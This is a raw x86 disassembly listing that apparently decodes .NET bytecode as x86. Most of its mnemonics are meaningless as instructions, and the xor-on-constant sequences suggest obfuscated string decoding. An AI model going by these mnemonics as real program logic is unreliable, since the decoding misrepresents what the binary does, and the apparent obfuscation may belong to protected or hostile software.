  404308:	19 18                	sbb    %ebx,(%eax)
  40430a:	8c 04 00             	mov    %es,(%eax,%eax,1)
  40430d:	00 01                	add    %al,(%ecx)
  40430f:	a2 11 0e 13 07       	mov    %al,0x7130e11
  404314:	08 11                	or     %dl,(%ecx)
  404316:	08 58 1f             	or     %bl,0x1f(%eax)
  404319:	20 58 11             	and    %bl,0x11(%eax)
  40431c:	04 58                	add    $0x58,%al
  40431e:	4a                   	dec    %edx
  40431f:	13 05 38 9d f8 ff    	adc    0xfff89d38,%eax
  404325:	ff 00                	incl   (%eax)
  404327:	08 11                	or     %dl,(%ecx)
  404329:	23 58 1f             	and    0x1f(%eax),%ebx
  40432c:	28 58 11             	sub    %bl,0x11(%eax)
  40432f:	04 58                	add    $0x58,%al
  404331:	4a                   	dec    %edx
  404332:	13 22                	adc    (%edx),%esp
  404334:	11 22                	adc    %esp,(%edx)
  404336:	15 2e 6c 08 11       	adc    $0x11086c2e,%eax
  40433b:	22 58 1f             	and    0x1f(%eax),%bl
  40433e:	20 58 11             	and    %bl,0x11(%eax)
  404341:	04 58                	add    $0x58,%al
  404343:	4a                   	dec    %edx
  404344:	13 1f                	adc    (%edi),%ebx
  404346:	1e                   	push   %ds
  404347:	8d 03                	lea    (%ebx),%eax
  404349:	00 00                	add    %al,(%eax)
  40434b:	01 13                	add    %edx,(%ebx)
  40434d:	0e                   	push   %cs
  40434e:	11 0e                	adc    %ecx,(%esi)
  404350:	17                   	pop    %ss
  404351:	17                   	pop    %ss
  404352:	8c 04 00             	mov    %es,(%eax,%eax,1)
  404355:	00 01                	add    %al,(%ecx)
  404357:	a2 11 0e 18 11       	mov    %al,0x11180e11
  40435c:	07                   	pop    %es
  40435d:	a2 11 0e 1a 11       	mov    %al,0x111a0e11
  404362:	1d a2 11 0e 1d       	sbb    $0x1d0e11a2,%eax
  404367:	11 19                	adc    %ebx,(%ecx)
  404369:	8c 04 00             	mov    %es,(%eax,%eax,1)
  40436c:	00 01                	add    %al,(%ecx)
  40436e:	a2 11 0e 1c 11       	mov    %al,0x111c0e11
  404373:	22 8c 04 00 00 01 a2 	and    -0x5dff0000(%esp,%eax,1),%cl
  40437a:	11 0e                	adc    %ecx,(%esi)
  40437c:	16                   	push   %ss
  40437d:	11 08                	adc    %ecx,(%eax)
  40437f:	8c 04 00             	mov    %es,(%eax,%eax,1)
  404382:	00 01                	add    %al,(%ecx)
  404384:	a2 11 0e 19 16       	mov    %al,0x16190e11
  404389:	8c 04 00             	mov    %es,(%eax,%eax,1)
  40438c:	00 01                	add    %al,(%ecx)
  40438e:	a2 11 0e 13 07       	mov    %al,0x7130e11
  404393:	08 11                	or     %dl,(%ecx)
  404395:	22 58 1f             	and    0x1f(%eax),%bl
  404398:	20 58 11             	and    %bl,0x11(%eax)
  40439b:	04 58                	add    $0x58,%al
  40439d:	4a                   	dec    %edx
  40439e:	13 05 38 1e f8 ff    	adc    0xfff81e38,%eax
  4043a4:	ff 00                	incl   (%eax)
  4043a6:	08 11                	or     %dl,(%ecx)
  4043a8:	23 58 11             	and    0x11(%eax),%ebx
  4043ab:	04 58                	add    $0x58,%al
  4043ad:	4a                   	dec    %edx
  4043ae:	13 23                	adc    (%ebx),%esp
  4043b0:	38 05 ff ff ff 00    	cmp    %al,0xffffff
  4043b6:	08 11                	or     %dl,(%ecx)
  4043b8:	10 58 1f             	adc    %bl,0x1f(%eax)
  4043bb:	18 58 11             	sbb    %bl,0x11(%eax)
  4043be:	04 58                	add    $0x58,%al
  4043c0:	4a                   	dec    %edx
  4043c1:	13 1f                	adc    (%edi),%ebx
  4043c3:	11 1d 13 0d 1e 8d    	adc    %ebx,0x8d1e0d13
  4043c9:	03 00                	add    (%eax),%eax
  4043cb:	00 01                	add    %al,(%ecx)
  4043cd:	13 0e                	adc    (%esi),%ecx
  4043cf:	11 0e                	adc    %ecx,(%esi)
  4043d1:	17                   	pop    %ss
  4043d2:	17                   	pop    %ss
  4043d3:	8c 04 00             	mov    %es,(%eax,%eax,1)
  4043d6:	00 01                	add    %al,(%ecx)
  4043d8:	a2 11 0e 18 11       	mov    %al,0x11180e11
  4043dd:	07                   	pop    %es
  4043de:	a2 11 0e 1a 11       	mov    %al,0x111a0e11
  4043e3:	1d a2 11 0e 1d       	sbb    $0x1d0e11a2,%eax
  4043e8:	11 19                	adc    %ebx,(%ecx)
  4043ea:	8c 04 00             	mov    %es,(%eax,%eax,1)
  4043ed:	00 01                	add    %al,(%ecx)
  4043ef:	a2 11 0e 1c 11       	mov    %al,0x111c0e11
  4043f4:	10 8c 04 00 00 01 a2 	adc    %cl,-0x5dff0000(%esp,%eax,1)
  4043fb:	11 0e                	adc    %ecx,(%esi)
  4043fd:	19 17                	sbb    %edx,(%edi)
  4043ff:	8c 04 00             	mov    %es,(%eax,%eax,1)
  404402:	00 01                	add    %al,(%ecx)
  404404:	a2 11 0e 13 07       	mov    %al,0x7130e11
  404409:	08 11                	or     %dl,(%ecx)
  40440b:	10 58 1f             	adc    %bl,0x1f(%eax)
  40440e:	18 58 11             	sbb    %bl,0x11(%eax)
  404411:	04 58                	add    $0x58,%al
  404413:	4a                   	dec    %edx
  404414:	13 05 38 a8 f7 ff    	adc    0xfff7a838,%eax
  40441a:	ff 00                	incl   (%eax)
  40441c:	11 05 13 19 11 19    	adc    %eax,0x19111913
  404422:	13 09                	adc    (%ecx),%ecx
  404424:	16                   	push   %ss
  404425:	13 10                	adc    (%eax),%edx
  404427:	1a 13                	sbb    (%ebx),%dl
  404429:	20 11                	and    %dl,(%ecx)
  40442b:	10 11                	adc    %dl,(%ecx)
  40442d:	20 58 18             	and    %bl,0x18(%eax)
  404430:	5b                   	pop    %ebx
  404431:	13 21                	adc    (%ecx),%esp
  404433:	08 20                	or     %ah,(%eax)
  404435:	f0 00 00             	lock add %al,(%eax)
  404438:	00 58 11             	add    %bl,0x11(%eax)
  40443b:	21 1f                	and    %ebx,(%edi)
  40443d:	48                   	dec    %eax
  40443e:	5a                   	pop    %edx
  40443f:	58                   	pop    %eax
  404440:	1e                   	push   %ds
  404441:	58                   	pop    %eax
  404442:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  404445:	4a                   	dec    %edx
  404446:	13 22                	adc    (%edx),%esp
  404448:	08 20                	or     %ah,(%eax)
  40444a:	f0 00 00             	lock add %al,(%eax)
  40444d:	00 58 11             	add    %bl,0x11(%eax)
  404450:	21 1f                	and    %ebx,(%edi)
  404452:	48                   	dec    %eax
  404453:	5a                   	pop    %edx
  404454:	58                   	pop    %eax
  404455:	1f                   	pop    %ds
  404456:	10 58 11             	adc    %bl,0x11(%eax)
  404459:	04 58                	add    $0x58,%al
  40445b:	4a                   	dec    %edx
  40445c:	13 23                	adc    (%ebx),%esp
  40445e:	11 09                	adc    %ecx,(%ecx)
  404460:	11 22                	adc    %esp,(%edx)
  404462:	11 23                	adc    %esp,(%ebx)
  404464:	58                   	pop    %eax
  404465:	2f                   	das
  404466:	0a 11                	or     (%ecx),%dl
  404468:	22 11                	and    (%ecx),%dl
  40446a:	09 30                	or     %esi,(%eax)
  40446c:	0c 11                	or     $0x11,%al
  40446e:	21 2b                	and    %ebp,(%ebx)
  404470:	10 11                	adc    %dl,(%ecx)
  404472:	21 17                	and    %edx,(%edi)
  404474:	58                   	pop    %eax
  404475:	13 10                	adc    (%eax),%edx
  404477:	2b b1 11 21 17 59    	sub    0x59172111(%ecx),%esi
  40447d:	13 20                	adc    (%eax),%esp
  40447f:	2b a9 00 13 0a 08    	sub    0x80a1300(%ecx),%ebp
  404485:	20 f0                	and    %dh,%al
  404487:	00 00                	add    %al,(%eax)
  404489:	00 58 11             	add    %bl,0x11(%eax)
  40448c:	0a 1f                	or     (%edi),%bl
  40448e:	48                   	dec    %eax
  40448f:	5a                   	pop    %edx
  404490:	58                   	pop    %eax
  404491:	1f                   	pop    %ds
  404492:	38 58 11             	cmp    %bl,0x11(%eax)
  404495:	04 58                	add    $0x58,%al
  404497:	4a                   	dec    %edx
  404498:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  40449b:	0c 13                	or     $0x13,%al
  40449d:	1c 11                	sbb    $0x11,%al
  40449f:	11 13                	adc    %edx,(%ebx)
  4044a1:	23 16                	and    (%esi),%edx
  4044a3:	13 22                	adc    (%edx),%esp
  4044a5:	1a 13                	sbb    (%ebx),%dl
  4044a7:	21 11                	and    %edx,(%ecx)
  4044a9:	22 11                	and    (%ecx),%dl
  4044ab:	21 58 18             	and    %ebx,0x18(%eax)
  4044ae:	5b                   	pop    %ebx
  4044af:	13 20                	adc    (%eax),%esp
  4044b1:	08 20                	or     %ah,(%eax)
  4044b3:	f0 00 00             	lock add %al,(%eax)
  4044b6:	00 58 11             	add    %bl,0x11(%eax)
  4044b9:	20 1f                	and    %bl,(%edi)
  4044bb:	48                   	dec    %eax
  4044bc:	5a                   	pop    %edx
  4044bd:	58                   	pop    %eax
  4044be:	1e                   	push   %ds
  4044bf:	58                   	pop    %eax
  4044c0:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4044c3:	4a                   	dec    %edx
  4044c4:	13 10                	adc    (%eax),%edx
  4044c6:	08 20                	or     %ah,(%eax)
  4044c8:	f0 00 00             	lock add %al,(%eax)
  4044cb:	00 58 11             	add    %bl,0x11(%eax)
  4044ce:	20 1f                	and    %bl,(%edi)
  4044d0:	48                   	dec    %eax
  4044d1:	5a                   	pop    %edx
  4044d2:	58                   	pop    %eax
  4044d3:	1f                   	pop    %ds
  4044d4:	10 58 11             	adc    %bl,0x11(%eax)
  4044d7:	04 58                	add    $0x58,%al
  4044d9:	4a                   	dec    %edx
  4044da:	13 09                	adc    (%ecx),%ecx
  4044dc:	11 23                	adc    %esp,(%ebx)
  4044de:	11 10                	adc    %edx,(%eax)
  4044e0:	11 09                	adc    %ecx,(%ecx)
  4044e2:	58                   	pop    %eax
  4044e3:	2f                   	das
  4044e4:	0a 11                	or     (%ecx),%dl
  4044e6:	10 11                	adc    %dl,(%ecx)
  4044e8:	23 30                	and    (%eax),%esi
  4044ea:	0c 11                	or     $0x11,%al
  4044ec:	20 2b                	and    %ch,(%ebx)
  4044ee:	10 11                	adc    %dl,(%ecx)
  4044f0:	20 17                	and    %dl,(%edi)
  4044f2:	58                   	pop    %eax
  4044f3:	13 22                	adc    (%edx),%esp
  4044f5:	2b b1 11 20 17 59    	sub    0x59172011(%ecx),%esi
  4044fb:	13 21                	adc    (%ecx),%esp
  4044fd:	2b a9 00 13 0a 08    	sub    0x80a1300(%ecx),%ebp
  404503:	20 f0                	and    %dh,%al
  404505:	00 00                	add    %al,(%eax)
  404507:	00 58 11             	add    %bl,0x11(%eax)
  40450a:	0a 1f                	or     (%edi),%bl
  40450c:	48                   	dec    %eax
  40450d:	5a                   	pop    %edx
  40450e:	58                   	pop    %eax
  40450f:	1f                   	pop    %ds
  404510:	38 58 11             	cmp    %bl,0x11(%eax)
  404513:	04 58                	add    $0x58,%al
  404515:	4a                   	dec    %edx
  404516:	13 0f                	adc    (%edi),%ecx
  404518:	11 0f                	adc    %ecx,(%edi)
  40451a:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  40451d:	11 13                	adc    %edx,(%ebx)
  40451f:	09 16                	or     %edx,(%esi)
  404521:	13 10                	adc    (%eax),%edx
  404523:	1a 13                	sbb    (%ebx),%dl
  404525:	20 11                	and    %dl,(%ecx)
  404527:	10 11                	adc    %dl,(%ecx)
  404529:	20 58 18             	and    %bl,0x18(%eax)
  40452c:	5b                   	pop    %ebx
  40452d:	13 21                	adc    (%ecx),%esp
  40452f:	08 20                	or     %ah,(%eax)
  404531:	58                   	pop    %eax
  404532:	02 00                	add    (%eax),%al
  404534:	00 58 11             	add    %bl,0x11(%eax)
  404537:	21 1f                	and    %ebx,(%edi)
  404539:	38 5a 58             	cmp    %bl,0x58(%edx)
  40453c:	1e                   	push   %ds
  40453d:	58                   	pop    %eax
  40453e:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  404541:	4a                   	dec    %edx
  404542:	13 22                	adc    (%edx),%esp
  404544:	08 20                	or     %ah,(%eax)
  404546:	58                   	pop    %eax
  404547:	02 00                	add    (%eax),%al
  404549:	00 58 11             	add    %bl,0x11(%eax)
  40454c:	21 1f                	and    %ebx,(%edi)
  40454e:	38 5a 58             	cmp    %bl,0x58(%edx)
  404551:	1f                   	pop    %ds
  404552:	10 58 11             	adc    %bl,0x11(%eax)
  404555:	04 58                	add    $0x58,%al
  404557:	4a                   	dec    %edx
  404558:	13 23                	adc    (%ebx),%esp
  40455a:	11 09                	adc    %ecx,(%ecx)
  40455c:	11 22                	adc    %esp,(%edx)
  40455e:	11 23                	adc    %esp,(%ebx)
  404560:	58                   	pop    %eax
  404561:	2f                   	das
  404562:	0a 11                	or     (%ecx),%dl
  404564:	22 11                	and    (%ecx),%dl
  404566:	09 30                	or     %esi,(%eax)
  404568:	0c 11                	or     $0x11,%al
  40456a:	21 2b                	and    %ebp,(%ebx)
  40456c:	10 11                	adc    %dl,(%ecx)
  40456e:	21 17                	and    %edx,(%edi)
  404570:	58                   	pop    %eax
  404571:	13 10                	adc    (%eax),%edx
  404573:	2b b1 11 21 17 59    	sub    0x59172111(%ecx),%esi
  404579:	13 20                	adc    (%eax),%esp
  40457b:	2b a9 00 13 0a 08    	sub    0x80a1300(%ecx),%ebp
  404581:	20 58 02             	and    %bl,0x2(%eax)
  404584:	00 00                	add    %al,(%eax)
  404586:	58                   	pop    %eax
  404587:	11 0a                	adc    %ecx,(%edx)
  404589:	1f                   	pop    %ds
  40458a:	38 5a 58             	cmp    %bl,0x58(%edx)
  40458d:	1f                   	pop    %ds
  40458e:	28 58 11             	sub    %bl,0x11(%eax)
  404591:	04 58                	add    $0x58,%al
  404593:	4a                   	dec    %edx
  404594:	13 08                	adc    (%eax),%ecx
  404596:	11 08                	adc    %ecx,(%eax)
  404598:	13 0f                	adc    (%edi),%ecx
  40459a:	00 11                	add    %dl,(%ecx)
  40459c:	07                   	pop    %es
  40459d:	14 3b                	adc    $0x3b,%al
  40459f:	7b 01                	jnp    0x4045a2
  4045a1:	00 00                	add    %al,(%eax)
  4045a3:	11 07                	adc    %eax,(%edi)
  4045a5:	17                   	pop    %ss
  4045a6:	9a a5 04 00 00 01 16 	lcall  $0x1601,$0x4a5
  4045ad:	3b 6c 01 00          	cmp    0x0(%ecx,%eax,1),%ebp
  4045b1:	00 11                	add    %dl,(%ecx)
  4045b3:	07                   	pop    %es
  4045b4:	1c 9a                	sbb    $0x9a,%al
  4045b6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4045b7:	04 00                	add    $0x0,%al
  4045b9:	00 01                	add    %al,(%ecx)
  4045bb:	11 1c 15 33 06 15 38 	adc    %ebx,0x38150633(,%edx,1)
  4045c2:	86 00                	xchg   %al,(%eax)
  4045c4:	00 00                	add    %al,(%eax)
  4045c6:	00 08                	add    %cl,(%eax)
  4045c8:	11 1c 58             	adc    %ebx,(%eax,%ebx,2)
  4045cb:	1f                   	pop    %ds
  4045cc:	18 58 11             	sbb    %bl,0x11(%eax)
  4045cf:	04 58                	add    $0x58,%al
  4045d1:	4a                   	dec    %edx
  4045d2:	13 1f                	adc    (%edi),%ebx
  4045d4:	16                   	push   %ss
  4045d5:	13 23                	adc    (%ebx),%esp
  4045d7:	1a 13                	sbb    (%ebx),%dl
  4045d9:	22 11                	and    (%ecx),%dl
  4045db:	23 11                	and    (%ecx),%edx
  4045dd:	22 58 18             	and    0x18(%eax),%bl
  4045e0:	5b                   	pop    %ebx
  4045e1:	13 21                	adc    (%ecx),%esp
  4045e3:	08 20                	or     %ah,(%eax)
  4045e5:	58                   	pop    %eax
  4045e6:	02 00                	add    (%eax),%al
  4045e8:	00 58 11             	add    %bl,0x11(%eax)
  4045eb:	21 1f                	and    %ebx,(%edi)
  4045ed:	38 5a 58             	cmp    %bl,0x58(%edx)
  4045f0:	1e                   	push   %ds
  4045f1:	58                   	pop    %eax
  4045f2:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4045f5:	4a                   	dec    %edx
  4045f6:	13 20                	adc    (%eax),%esp
  4045f8:	08 20                	or     %ah,(%eax)
  4045fa:	58                   	pop    %eax
  4045fb:	02 00                	add    (%eax),%al
  4045fd:	00 58 11             	add    %bl,0x11(%eax)
  404600:	21 1f                	and    %ebx,(%edi)
  404602:	38 5a 58             	cmp    %bl,0x58(%edx)
  404605:	1f                   	pop    %ds
  404606:	10 58 11             	adc    %bl,0x11(%eax)
  404609:	04 58                	add    $0x58,%al
  40460b:	4a                   	dec    %edx
  40460c:	13 10                	adc    (%eax),%edx
  40460e:	11 1f                	adc    %ebx,(%edi)
  404610:	11 20                	adc    %esp,(%eax)
  404612:	11 10                	adc    %edx,(%eax)
  404614:	58                   	pop    %eax
  404615:	2f                   	das
  404616:	0a 11                	or     (%ecx),%dl
  404618:	20 11                	and    %dl,(%ecx)
  40461a:	1f                   	pop    %ds
  40461b:	30 0c 11             	xor    %cl,(%ecx,%edx,1)
  40461e:	21 2b                	and    %ebp,(%ebx)
  404620:	10 11                	adc    %dl,(%ecx)
  404622:	21 17                	and    %edx,(%edi)
  404624:	58                   	pop    %eax
  404625:	13 23                	adc    (%ebx),%esp
  404627:	2b b1 11 21 17 59    	sub    0x59172111(%ecx),%esi
  40462d:	13 22                	adc    (%edx),%esp
  40462f:	2b a9 00 13 08 08    	sub    0x8081300(%ecx),%ebp
  404635:	20 58 02             	and    %bl,0x2(%eax)
  404638:	00 00                	add    %al,(%eax)
  40463a:	58                   	pop    %eax
  40463b:	11 08                	adc    %ecx,(%eax)
  40463d:	1f                   	pop    %ds
  40463e:	38 5a 58             	cmp    %bl,0x58(%edx)
  404641:	1f                   	pop    %ds
  404642:	28 58 11             	sub    %bl,0x11(%eax)
  404645:	04 58                	add    $0x58,%al
  404647:	4a                   	dec    %edx
  404648:	13 0a                	adc    (%edx),%ecx
  40464a:	11 0a                	adc    %ecx,(%edx)
  40464c:	00 40 a4             	add    %al,-0x5c(%eax)
  40464f:	00 00                	add    %al,(%eax)
  404651:	00 11                	add    %dl,(%ecx)
  404653:	0c 13                	or     $0x13,%al
  404655:	0a 00                	or     (%eax),%al
  404657:	11 0a                	adc    %ecx,(%edx)
  404659:	11 1c 2e             	adc    %ebx,(%esi,%ebp,1)
  40465c:	11 11                	adc    %edx,(%ecx)
  40465e:	0a 15 2e 16 08 11    	or     0x1108162e,%dl
  404664:	0a 58 11             	or     0x11(%eax),%bl
  404667:	04 58                	add    $0x58,%al
  404669:	4a                   	dec    %edx
  40466a:	13 0a                	adc    (%edx),%ecx
  40466c:	2b e8                	sub    %eax,%ebp
  40466e:	00 11                	add    %dl,(%ecx)
  404670:	11 13                	adc    %edx,(%ebx)
  404672:	05 38 4b f5 ff       	add    $0xfff54b38,%eax
  404677:	ff 00                	incl   (%eax)
  404679:	08 11                	or     %dl,(%ecx)
  40467b:	1c 58                	sbb    $0x58,%al
  40467d:	1f                   	pop    %ds
  40467e:	28 58 11             	sub    %bl,0x11(%eax)
  404681:	04 58                	add    $0x58,%al
  404683:	4a                   	dec    %edx
  404684:	13 08                	adc    (%eax),%ecx
  404686:	11 08                	adc    %ecx,(%eax)
  404688:	15 2e 5b 08 11       	adc    $0x11085b2e,%eax
  40468d:	08 58 1f             	or     %bl,0x1f(%eax)
  404690:	20 58 11             	and    %bl,0x11(%eax)
  404693:	04 58                	add    $0x58,%al
  404695:	4a                   	dec    %edx
  404696:	13 09                	adc    (%ecx),%ecx
  404698:	1e                   	push   %ds
  404699:	8d 03                	lea    (%ebx),%eax
  40469b:	00 00                	add    %al,(%eax)
  40469d:	01 13                	add    %edx,(%ebx)
  40469f:	0e                   	push   %cs
  4046a0:	11 0e                	adc    %ecx,(%esi)
  4046a2:	17                   	pop    %ss
  4046a3:	16                   	push   %ss
  4046a4:	8c 04 00             	mov    %es,(%eax,%eax,1)
  4046a7:	00 01                	add    %al,(%ecx)
  4046a9:	a2 11 0e 18 11       	mov    %al,0x11180e11
  4046ae:	07                   	pop    %es
  4046af:	a2 11 0e 1b 11       	mov    %al,0x111b0e11
  4046b4:	11 8c 04 00 00 01 a2 	adc    %ecx,-0x5dff0000(%esp,%eax,1)
  4046bb:	11 0e                	adc    %ecx,(%esi)
  4046bd:	1c 11                	sbb    $0x11,%al
  4046bf:	08 8c 04 00 00 01 a2 	or     %cl,-0x5dff0000(%esp,%eax,1)
  4046c6:	11 0e                	adc    %ecx,(%esi)
  4046c8:	19 16                	sbb    %edx,(%esi)
  4046ca:	8c 04 00             	mov    %es,(%eax,%eax,1)
  4046cd:	00 01                	add    %al,(%ecx)
  4046cf:	a2 11 0e 13 07       	mov    %al,0x7130e11
  4046d4:	08 11                	or     %dl,(%ecx)
  4046d6:	08 58 1f             	or     %bl,0x1f(%eax)
  4046d9:	20 58 11             	and    %bl,0x11(%eax)
  4046dc:	04 58                	add    $0x58,%al
  4046de:	4a                   	dec    %edx
  4046df:	13 05 38 dd f4 ff    	adc    0xfff4dd38,%eax
  4046e5:	ff 00                	incl   (%eax)
  4046e7:	08 11                	or     %dl,(%ecx)
  4046e9:	1c 58                	sbb    $0x58,%al
  4046eb:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4046ee:	4a                   	dec    %edx
  4046ef:	13 1c 38             	adc    (%eax,%edi,1),%ebx
  4046f2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4046f3:	fe                   	(bad)
  4046f4:	ff                   	(bad)
  4046f5:	ff 00                	incl   (%eax)
  4046f7:	11 07                	adc    %eax,(%edi)
  4046f9:	1c 9a                	sbb    $0x9a,%al
  4046fb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4046fc:	04 00                	add    $0x0,%al
  4046fe:	00 01                	add    %al,(%ecx)
  404700:	11 0f                	adc    %ecx,(%edi)
  404702:	33 09                	xor    (%ecx),%ecx
  404704:	11 11                	adc    %edx,(%ecx)
  404706:	13 05 38 b6 f4 ff    	adc    0xfff4b638,%eax
  40470c:	ff 00                	incl   (%eax)
  40470e:	11 07                	adc    %eax,(%edi)
  404710:	18 9a 74 01 00 00    	sbb    %bl,0x174(%edx)
  404716:	1b 13                	sbb    (%ebx),%edx
  404718:	07                   	pop    %es
  404719:	38 7c fe ff          	cmp    %bh,-0x1(%esi,%edi,8)
  40471d:	ff 00                	incl   (%eax)
  40471f:	11 0c 13             	adc    %ecx,(%ebx,%edx,1)
  404722:	09 00                	or     %eax,(%eax)
  404724:	11 09                	adc    %ecx,(%ecx)
  404726:	11 1c 2e             	adc    %ebx,(%esi,%ebp,1)
  404729:	11 11                	adc    %edx,(%ecx)
  40472b:	09 15 2e 16 08 11    	or     %edx,0x1108162e
  404731:	09 58 11             	or     %ebx,0x11(%eax)
  404734:	04 58                	add    $0x58,%al
  404736:	4a                   	dec    %edx
  404737:	13 09                	adc    (%ecx),%ecx
  404739:	2b e8                	sub    %eax,%ebp
  40473b:	00 11                	add    %dl,(%ecx)
  40473d:	11 13                	adc    %edx,(%ebx)
  40473f:	05 38 7e f4 ff       	add    $0xfff47e38,%eax
  404744:	ff 00                	incl   (%eax)
  404746:	08 11                	or     %dl,(%ecx)
  404748:	1c 58                	sbb    $0x58,%al
  40474a:	1f                   	pop    %ds
  40474b:	28 58 11             	sub    %bl,0x11(%eax)
  40474e:	04 58                	add    $0x58,%al
  404750:	4a                   	dec    %edx
  404751:	13 10                	adc    (%eax),%edx
  404753:	11 10                	adc    %edx,(%eax)
  404755:	15 2e 5b 08 11       	adc    $0x11085b2e,%eax
  40475a:	10 58 1f             	adc    %bl,0x1f(%eax)
  40475d:	20 58 11             	and    %bl,0x11(%eax)
  404760:	04 58                	add    $0x58,%al
  404762:	4a                   	dec    %edx
  404763:	13 20                	adc    (%eax),%esp
  404765:	1e                   	push   %ds
  404766:	8d 03                	lea    (%ebx),%eax
  404768:	00 00                	add    %al,(%eax)
  40476a:	01 13                	add    %edx,(%ebx)
  40476c:	0e                   	push   %cs
  40476d:	11 0e                	adc    %ecx,(%esi)
  40476f:	17                   	pop    %ss
  404770:	16                   	push   %ss
  404771:	8c 04 00             	mov    %es,(%eax,%eax,1)
  404774:	00 01                	add    %al,(%ecx)
  404776:	a2 11 0e 18 11       	mov    %al,0x11180e11
  40477b:	07                   	pop    %es
  40477c:	a2 11 0e 1b 11       	mov    %al,0x111b0e11
  404781:	11 8c 04 00 00 01 a2 	adc    %ecx,-0x5dff0000(%esp,%eax,1)
  404788:	11 0e                	adc    %ecx,(%esi)
  40478a:	1c 11                	sbb    $0x11,%al
  40478c:	10 8c 04 00 00 01 a2 	adc    %cl,-0x5dff0000(%esp,%eax,1)
  404793:	11 0e                	adc    %ecx,(%esi)
  404795:	19 16                	sbb    %edx,(%esi)
  404797:	8c 04 00             	mov    %es,(%eax,%eax,1)
  40479a:	00 01                	add    %al,(%ecx)
  40479c:	a2 11 0e 13 07       	mov    %al,0x7130e11
  4047a1:	08 11                	or     %dl,(%ecx)
  4047a3:	10 58 1f             	adc    %bl,0x1f(%eax)
  4047a6:	20 58 11             	and    %bl,0x11(%eax)
  4047a9:	04 58                	add    $0x58,%al
  4047ab:	4a                   	dec    %edx
  4047ac:	13 05 38 10 f4 ff    	adc    0xfff41038,%eax
  4047b2:	ff 00                	incl   (%eax)
  4047b4:	08 11                	or     %dl,(%ecx)
  4047b6:	1c 58                	sbb    $0x58,%al
  4047b8:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4047bb:	4a                   	dec    %edx
  4047bc:	13 1c 38             	adc    (%eax,%edi,1),%ebx
  4047bf:	d7                   	xlat   %ds:(%ebx)
  4047c0:	fd                   	std
  4047c1:	ff                   	(bad)
  4047c2:	ff 13                	call   *(%ebx)
  4047c4:	25 11 24 17 2e       	and    $0x2e172411,%eax
  4047c9:	0c 11                	or     $0x11,%al
  4047cb:	25 13 1d 15 13       	and    $0x13151d13,%eax
  4047d0:	1e                   	push   %ds
  4047d1:	dd ed                	fucomp %st(5)
  4047d3:	f7 ff                	idiv   %edi
  4047d5:	ff 11                	call   *(%ecx)
  4047d7:	25 7a 00 2a 00       	and    $0x2a007a,%eax
  4047dc:	41                   	inc    %ecx
  4047dd:	1c 00                	sbb    $0x0,%al
  4047df:	00 00                	add    %al,(%eax)
  4047e1:	00 00                	add    %al,(%eax)
  4047e3:	00 33                	add    %dh,(%ebx)
  4047e5:	00 00                	add    %al,(%eax)
  4047e7:	00 00                	add    %al,(%eax)
  4047e9:	0c 00                	or     $0x0,%al
  4047eb:	00 33                	add    %dh,(%ebx)
  4047ed:	0c 00                	or     $0x0,%al
  4047ef:	00 16                	add    %dl,(%esi)
  4047f1:	00 00                	add    %al,(%eax)
  4047f3:	00 08                	add    %cl,(%eax)
  4047f5:	00 00                	add    %al,(%eax)
  4047f7:	01 13                	add    %edx,(%ebx)
  4047f9:	30 05 00 49 03 00    	xor    %al,0x34900
  4047ff:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404802:	00 11                	add    %dl,(%ecx)
  404804:	20 1a                	and    %bl,(%edx)
  404806:	00 00                	add    %al,(%eax)
  404808:	00 8d 06 00 00 01    	add    %cl,0x1000006(%ebp)
  40480e:	25 fe 0e 00 00       	and    $0xefe,%eax
  404813:	fe 09                	decb   (%ecx)
  404815:	05 00 fe 0c 00       	add    $0xcfe00,%eax
  40481a:	00 81 03 00 00 01    	add    %al,0x1000003(%ecx)
  404820:	fe 09                	decb   (%ecx)
  404822:	05 00 71 03 00       	add    $0x37100,%eax
  404827:	00 01                	add    %al,(%ecx)
  404829:	20 00                	and    %al,(%eax)
  40482b:	00 00                	add    %al,(%eax)
  40482d:	00 20                	add    %ah,(%eax)
  40482f:	c9                   	leave
  404830:	00 00                	add    %al,(%eax)
  404832:	00 20                	add    %ah,(%eax)
  404834:	9b                   	fwait
  404835:	00 00                	add    %al,(%eax)
  404837:	00 61 9d             	add    %ah,-0x63(%ecx)
  40483a:	fe 09                	decb   (%ecx)
  40483c:	05 00 71 03 00       	add    $0x37100,%eax
  404841:	00 01                	add    %al,(%ecx)
  404843:	20 01                	and    %al,(%ecx)
  404845:	00 00                	add    %al,(%eax)
  404847:	00 7f 0e             	add    %bh,0xe(%edi)
  40484a:	00 00                	add    %al,(%eax)
  40484c:	04 d3                	add    $0xd3,%al
  40484e:	20 01                	and    %al,(%ecx)
  404850:	00 00                	add    %al,(%eax)
  404852:	00 58 47             	add    %bl,0x47(%eax)
  404855:	69 20 8b 00 00 00    	imul   $0x8b,(%eax),%esp
  40485b:	61                   	popa
  40485c:	9d                   	popf
  40485d:	fe 09                	decb   (%ecx)
  40485f:	05 00 71 03 00       	add    $0x37100,%eax
  404864:	00 01                	add    %al,(%ecx)
  404866:	20 02                	and    %al,(%edx)
  404868:	00 00                	add    %al,(%eax)
  40486a:	00 20                	add    %ah,(%eax)
  40486c:	64 00 00             	add    %al,%fs:(%eax)
  40486f:	00 20                	add    %ah,(%eax)
  404871:	36 00 00             	add    %al,%ss:(%eax)
  404874:	00 61 9d             	add    %ah,-0x63(%ecx)
  404877:	fe 09                	decb   (%ecx)
  404879:	05 00 71 03 00       	add    $0x37100,%eax
  40487e:	00 01                	add    %al,(%ecx)
  404880:	20 03                	and    %al,(%ebx)
  404882:	00 00                	add    %al,(%eax)
  404884:	00 20                	add    %ah,(%eax)
  404886:	29 00                	sub    %eax,(%eax)
  404888:	00 00                	add    %al,(%eax)
  40488a:	20 09                	and    %cl,(%ecx)
  40488c:	00 00                	add    %al,(%eax)
  40488e:	00 61 9d             	add    %ah,-0x63(%ecx)
  404891:	fe 09                	decb   (%ecx)
  404893:	05 00 71 03 00       	add    $0x37100,%eax
  404898:	00 01                	add    %al,(%ecx)
